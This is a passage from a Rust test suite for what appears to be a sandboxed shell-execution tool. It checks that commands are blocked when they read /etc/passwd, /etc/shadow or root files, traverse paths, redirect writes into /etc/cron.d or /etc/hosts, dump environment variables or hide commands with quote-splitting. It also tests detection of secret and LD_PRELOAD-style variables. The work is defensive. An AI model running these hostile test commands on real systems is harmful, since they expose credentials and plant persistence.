        .unwrap_err();
        assert!(
            format!("{}", err).contains("dd"),
            "Should block d\"d\" (dd bypass)"
        );
    }

    // ── F-014: Path Restriction Tests ────────────────────────────────────

    #[test]
    fn blocks_cat_outside_allowed() {
        // cat /etc/passwd is outside allowed prefixes (/tmp, /var/tmp, /home)
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "cat /etc/passwd"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("outside allowed directories"),
            "Should block cat /etc/passwd"
        );
    }

    #[test]
    fn blocks_ls_tilde_ssh() {
        // ls ~/.ssh/ expands to /home/user/.ssh/ which is within /home but
        // .ssh is fine as it's a subdirectory — wait, ~/.ssh/ IS within /home.
        // Let me test with a path outside /home like ~/../root/.ssh
        // Actually ~/../root is traversal, which path validation catches.
        // Test: ls ~/../../etc/passwd contains ".." which is rejected.
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "ls ~/../../etc/passwd"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        // Should be blocked by ShellExec path check or by the ".." rejection
        let msg = format!("{}", err);
        assert!(
            msg.contains("outside allowed") || msg.contains("traversal"),
            "Should block ls ~/../../etc/passwd, got: {}",
            msg
        );
    }

    #[test]
    fn blocks_path_to_root() {
        // Reading files in /root/ should be blocked (outside allowed prefixes)
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "cat /root/.bashrc"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("outside allowed directories"),
            "Should block cat /root/.bashrc"
        );
    }

    #[test]
    fn allows_cat_in_tmp() {
        // cat /tmp/somefile should be ALLOWED (within /tmp prefix)
        // Use echo to avoid the file-not-found issue
        let r = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "echo test > /tmp/runtimo_path_test.txt && cat /tmp/runtimo_path_test.txt"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        );
        // Clean up
        let _ = std::fs::remove_file("/tmp/runtimo_path_test.txt");
        match r {
            Ok(o) => assert_eq!(o.status, "ok", "Should allow cat in /tmp"),
            Err(e) => {
                let msg = format!("{}", e);
                assert!(
                    !msg.contains("outside allowed"),
                    "Should NOT block /tmp path, got: {}",
                    msg
                );
            }
        }
    }

    #[test]
    fn allows_cat_in_home() {
        // cat $HOME/somefile should be ALLOWED (within allowed prefix)
        let home = std::env::var("HOME").unwrap_or_else(|_| "/home/user".to_string());
        let allowed = crate::config::RuntimoConfig::get_allowed_prefixes();
        let is_allowed = allowed
            .iter()
            .any(|p| home.starts_with(p) || p.starts_with(&home));
        if !is_allowed {
            // Skip test when HOME is outside allowed prefixes (e.g., /root in CI/containers)
            eprintln!("SKIP: HOME ({}) is outside allowed prefixes; test requires HOME within allowed area", home);
            return;
        }
        let test_path = format!("{}/runtimo_home_path_test.txt", home);
        let cmd = format!("echo ok > {} && cat {}", test_path, test_path);
        let r = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": cmd}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        );
        let _ = std::fs::remove_file(&test_path);
        match r {
            Ok(o) => assert_eq!(o.status, "ok", "Should allow cat in HOME"),
            Err(e) => {
                let msg = format!("{}", e);
                assert!(
                    !msg.contains("outside allowed"),
                    "Should NOT block HOME path, got: {}",
                    msg
                );
            }
        }
    }

    // ── GAP-08: Variable-expanded path tests ───────────────────────────

    #[test]
    fn blocks_var_expanded_path_outside_allowed() {
        // cat $HOME/.ssh/id_ed25519 should be blocked (outside /tmp, /var/tmp,
        // but typically inside /home. Actually this IS within /home prefix.
        // Let's use a path that's definitely outside: /etc/shadow via variable)
        // Test: cat $HOME/../../etc/shadow — contains ".." which is blocked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "cat $HOME/../../etc/shadow"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        let msg = format!("{}", err);
        assert!(
            msg.contains("outside allowed") || msg.contains("traversal"),
            "Should block $HOME/../../etc/shadow, got: {}",
            msg
        );
    }

    #[test]
    fn blocks_var_brace_expanded_path() {
        // cat ${HOME}/../../etc/shadow — brace syntax
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "cat ${HOME}/../../etc/shadow"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        let msg = format!("{}", err);
        assert!(
            msg.contains("outside allowed") || msg.contains("traversal"),
            "Should block brace-syntax var expansion"
        );
    }

    #[test]
    fn test_expand_shell_vars_resolves_home() {
        // expand_shell_vars should resolve $HOME to the actual home directory
        let expanded = expand_shell_vars("$HOME/.ssh");
        let home = std::env::var("HOME").unwrap_or_default();
        assert!(
            expanded.starts_with(&home),
            "Should expand $HOME, got: {}",
            expanded
        );
        assert!(
            expanded.ends_with("/.ssh"),
            "Should keep suffix, got: {}",
            expanded
        );
    }

    #[test]
    fn test_expand_shell_vars_brace_syntax() {
        let expanded = expand_shell_vars("${HOME}/.ssh");
        let home = std::env::var("HOME").unwrap_or_default();
        assert!(
            expanded.starts_with(&home),
            "Should expand brace-syntax var"
        );
    }

    // ── GAP-10: Inline redirect path tests ────────────────────────────

    #[test]
    fn blocks_redirect_to_outside_path() {
        // echo evil >/etc/cron.d/backdoor — redirect path should be checked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "echo evil >/etc/cron.d/backdoor"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("outside allowed directories"),
            "Should block redirect to /etc/cron.d/backdoor"
        );
    }

    #[test]
    fn blocks_append_redirect_to_outside_path() {
        // echo evil >>/etc/hosts — append redirect should also be checked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "echo evil >>/etc/hosts"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("outside allowed directories"),
            "Should block append redirect to /etc/hosts"
        );
    }

    #[test]
    fn blocks_stderr_redirect_outside() {
        // cmd 2>/etc/malicious — stderr redirect should be checked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "ls 2>/etc/malicious"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("outside allowed directories"),
            "Should block 2> redirect to /etc/malicious"
        );
    }

    #[test]
    fn allows_redirect_to_allowed_path() {
        // echo hello >/tmp/test_redirect.txt should be allowed
        let r = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "echo hello >/tmp/runtimo_redirect_test.txt"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        );
        let _ = std::fs::remove_file("/tmp/runtimo_redirect_test.txt");
        match r {
            Ok(o) => assert_eq!(o.status, "ok"),
            Err(e) => {
                assert!(
                    !format!("{}", e).contains("outside allowed"),
                    "Should NOT block redirect to /tmp, got: {}",
                    e
                );
            }
        }
    }

    // ── GAP-13: Relative path traversal tests ──────────────────────────

    #[test]
    fn blocks_relative_parent_traversal() {
        // cat ../../etc/passwd — relative path escaping from /tmp
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "cat ../../etc/passwd"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("outside allowed directories"),
            "Should block relative path traversal to /etc/passwd"
        );
    }

    #[test]
    fn blocks_deep_relative_traversal() {
        // cat ./../../../etc/shadow — deeper traversal
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "cat ./../../../etc/shadow"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("outside allowed directories"),
            "Should block deep relative traversal"
        );
    }

    #[test]
    fn allows_relative_within_allowed() {
        // Relative paths resolve against CWD. During testing, CWD is
        // the project root (outside /tmp), so relative paths won't be
        // within allowed prefixes. Use an absolute /tmp path instead
        // for the "allowed" case.
        let test_file = "/tmp/runtimo_relative_allowed_test.txt";
        let r = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": format!("echo ok > {}", test_file)}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        );
        let _ = std::fs::remove_file(test_file);
        match r {
            Ok(o) => assert_eq!(o.status, "ok", "Should allow path within /tmp"),
            Err(e) => {
                let msg = format!("{}", e);
                assert!(
                    !msg.contains("outside allowed"),
                    "Should NOT block /tmp path, got: {}",
                    msg
                );
            }
        }
    }

    // ── F-015: Env Protection Tests ─────────────────────────────────────

    #[test]
    fn blocks_env_command() {
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "env"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("environment variable dumping"),
            "Should block `env` command"
        );
    }

    #[test]
    fn blocks_printenv_command() {
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "printenv"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("environment variable dumping"),
            "Should block `printenv` command"
        );
    }

    #[test]
    fn blocks_set_command() {
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "set"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("environment variable dumping"),
            "Should block `set` command"
        );
    }

    #[test]
    fn blocks_export_command() {
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "export"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("environment variable dumping"),
            "Should block `export` command"
        );
    }

    // ── GAP-12: export with assignment still blocked ──────────────────

    #[test]
    fn blocks_export_with_assignment() {
        // GAP-12: export FOO=bar should also be blocked — the export
        // keyword itself triggers the env-dumping blocklist.
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "export FOO=bar"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("environment variable dumping"),
            "Should block `export FOO=bar` (export with assignment)"
        );
    }

    #[test]
    fn blocks_declare_p_command() {
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "declare -p"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("environment variable dumping"),
            "Should block `declare -p` command"
        );
    }

    #[test]
    fn blocks_env_via_quote_bypass() {
        // F-013 + F-015: e"n"v should also be blocked
        let err = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "e\"n\"v"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap_err();
        assert!(
            format!("{}", err).contains("environment variable dumping"),
            "Should block e\"n\"v (quoted env bypass)"
        );
    }

    #[test]
    fn allows_harmless_command_with_env_check() {
        // Normal commands should still work even with env sanitization
        let r = Capability::execute(
            &ShellExec,
            &serde_json::json!({"cmd": "echo hello"}),
            &Context {
                dry_run: false,
                job_id: "test".into(),
                working_dir: std::env::temp_dir(),
            },
        )
        .unwrap();
        assert_eq!(r.status, "ok");
        assert!(r.data.as_ref().unwrap()["stdout"]
            .as_str()
            .unwrap()
            .contains("hello"));
    }

    #[test]
    fn is_sensitive_env_var_detects_aws() {
        assert!(is_sensitive_env_var("AWS_ACCESS_KEY_ID"));
        assert!(is_sensitive_env_var("AWS_SECRET_ACCESS_KEY"));
        assert!(is_sensitive_env_var("aws_session_token")); // case-insensitive
    }

    #[test]
    fn is_sensitive_env_var_detects_suffixes() {
        assert!(is_sensitive_env_var("MYAPP_API_KEY"));
        assert!(is_sensitive_env_var("GITHUB_TOKEN"));
        assert!(is_sensitive_env_var("DB_PASSWORD"));
        assert!(is_sensitive_env_var("STRIPE_SECRET_KEY"));
    }

    #[test]
    fn is_sensitive_env_var_allows_safe() {
        assert!(!is_sensitive_env_var("HOME"));
        assert!(!is_sensitive_env_var("USER"));
        assert!(!is_sensitive_env_var("PATH"));
        assert!(!is_sensitive_env_var("TERM"));
        assert!(!is_sensitive_env_var("LANG"));
        assert!(!is_sensitive_env_var("RUNTIMO_ENABLE_NETWORK"));
    }

    // ── GAP-07: Non-secret vars matching suffix patterns ──────────────

    #[test]
    fn is_sensitive_env_var_allows_known_non_secret_suffix() {
        // GAP-07: FOREIGN_KEY matches *_KEY suffix but is a database term
        assert!(!is_sensitive_env_var("FOREIGN_KEY"));
        assert!(!is_sensitive_env_var("PRIMARY_KEY"));
        assert!(!is_sensitive_env_var("PUBLIC_KEY"));
        assert!(!is_sensitive_env_var("BASE_URL"));
    }

    // ── GAP-15: Dynamic linker env var tests ───────────────────────────

    #[test]
    fn is_sensitive_env_var_detects_ld_preload() {
        // LD_PRELOAD can inject arbitrary shared libraries
        assert!(is_sensitive_env_var("LD_PRELOAD"));
        assert!(is_sensitive_env_var("LD_LIBRARY_PATH"));
        assert!(is_sensitive_env_var("LD_DEBUG"));
        assert!(is_sensitive_env_var("LD_BIND_NOW"));
    }

    #[test]
    fn is_sensitive_env_var_detects_dyld() {
        // macOS dynamic linker injection
        assert!(is_sensitive_env_var("DYLD_INSERT_LIBRARIES"));
        assert!(is_sensitive_env_var("DYLD_LIBRARY_PATH"));
    }

    #[test]
    fn sanitized_env_strips_secrets() {
        // Set a test secret and verify it's stripped
        std::env::set_var("RUNTIMO_TEST_SECRET_KEY", "test-value");
        let env = sanitized_env();
        std::env::remove_var("RUNTIMO_TEST_SECRET_KEY");

        assert!(
            !env.iter()
                .map(|(k, _)| k.as_str())
                .any(|x| x == "RUNTIMO_TEST_SECRET_KEY"),
            "RUNTIMO_TEST_SECRET_KEY should be stripped from env"
        );
    }

    #[test]
    fn sanitized_env_preserves_safe() {
        let env = sanitized_env();
        let keys: Vec<&str> = env.iter().map(|(k, _)| k.as_str()).collect();
        assert!(keys.contains(&"HOME"), "HOME should be preserved");
        assert!(keys.contains(&"USER"), "USER should be preserved");
    }
}
